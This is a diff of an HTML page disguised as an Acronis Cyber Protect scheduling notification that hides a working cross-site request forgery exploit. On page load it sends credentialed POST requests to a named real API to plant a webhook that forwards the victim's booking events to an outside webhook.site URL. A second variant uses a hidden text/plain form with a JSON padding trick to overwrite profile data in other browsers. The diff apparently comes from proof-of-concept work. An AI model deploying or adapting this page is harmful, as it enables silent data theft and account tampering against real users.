@@ -13,7 +13,7 @@
   .bd{padding:26px 28px;color:#333;font-size:14px;line-height:1.6}
   .btn{display:inline-block;background:#e5484d;color:#fff;padding:11px 26px;border-radius:6px;text-decoration:none;font-weight:600;margin-top:14px}
   .ft{padding:14px 28px;background:#fafafa;border-top:1px solid #eee;font-size:11px;color:#999}
-  .dbg{display:none;margin:10px 28px 20px;font:11px monospace;color:#0a0;white-space:pre-wrap}
+  .dbg{margin:10px 28px 20px;font:11px monospace;color:#0a0;white-space:pre-wrap}
 </style>
 </head>
 <body>
@@ -28,19 +28,15 @@
     <p>Please confirm your availability to secure this slot.</p>
     <a class="btn" href="#" onclick="return false;">Review request</a>
   </div>
-  <div class="ft">Acronis Cyber Protect &middot; This notification was sent because you are subscribed to scheduling updates.<br>Do not reply to this message.</div>
-  <div class="dbg" id="dbg"></div>
+  <div class="ft">Acronis Cyber Protect &middot; This notification was sent because you are subscribed to scheduling updates.</div>
+  <div class="dbg" id="dbg">[*] payload armed</div>
 </div>
+
+<!-- ============ VARIANT A: silent fetch (Chrome / Edge — third-party SameSite=None flows) ============ -->
 <script>
-/* ---------------------------------------------------------------
-   CSRF payload — runs silently on page load.
-   Content-Type text/plain = CORS-simple (no preflight).
-   Session cookie SameSite=None = attached automatically.
-   No Origin validation server-side = mutation executes.
----------------------------------------------------------------- */
 const T = "https://webhook.site/dc97c56b-3137-4b2e-8834-c7ac4d75c32a";
 const dbg = document.getElementById("dbg");
-const log = (m) => { dbg.style.display = "block"; dbg.textContent += m + "\n"; };
+const log = (m) => { dbg.textContent += "\n" + m; };
 
 fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
   method: "POST",
@@ -48,23 +44,26 @@ fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
   credentials: "include",
   body: JSON.stringify({ "0": { "json": {
     subscriberUrl: T,
-    eventTriggers: ["BOOKING_CREATED","BOOKING_RESCHEDULED","BOOKING_CANCELLED","BOOKING_REQUESTED","BOOKING_REJECTED","BOOKING_PAID","BOOKING_NO_SHOW_UPDATED"],
+    eventTriggers: ["BOOKING_CREATED","BOOKING_RESCHEDULED","BOOKING_CANCELLED","BOOKING_REQUESTED","BOOKING_PAID"],
     active: true,
     payloadTemplate: "default_listener"
   }}})
-}).then(r => r.text()).then(t => {
-  const ok = t.includes('"result"');
-  log("[*] webhook/create  -> " + (ok ? "PLANTED ✓ (attacker now receives all victim bookings)" : "failed: " + t.slice(0,120)));
-}).catch(e => log("[*] webhook/create  -> err " + e));
+}).then(() => log("[A] fetch webhook/create fired (opaque response = normal)"))
+  .catch(() => log("[A] fetch blocked by browser cookie policy (use Variant B)"));
+</script>
 
-fetch("https://15.acronis.com/api/trpc/me/updateProfile?batch=1", {
-  method: "POST",
-  headers: { "Content-Type": "text/plain" },
-  credentials: "include",
-  body: JSON.stringify({ "0": { "json": { "metadata": { "csrfProof": "poisoned-by-" + location.host } } }})
-}).then(r => r.text()).then(t => {
-  log("[*] me/updateProfile -> " + (t.includes('"result"') ? "executed ✓ (profile writable)" : "failed"));
-}).catch(e => log("[*] me/updateProfile -> err " + e));
+<!-- ============ VARIANT B: top-level form POST (Firefox/Safari-proof: navigation = first-party, cookie always sent) ============
+     enctype="text/plain" serializes as  name + "=" + value
+     name = {"0":{"json":{...}},"pad":"   value = "}      →  body = {"0":{"json":{...}},"pad":"="}  (valid JSON)      -->
+<form id="ff" method="POST" enctype="text/plain"
+      action="https://15.acronis.com/api/trpc/me/updateProfile?batch=1">
+  <input type="hidden" name='{"0":{"json":{"metadata":{"csrfProof":"mon3m.site"}}},"pad":"' value='"}'>
+</form>
+<script>
+  setTimeout(() => {
+    log("[B] submitting top-level text/plain form (Firefox/Safari path)...");
+    document.getElementById("ff").submit();
+  }, 800);
 </script>
 </body>
 </html>
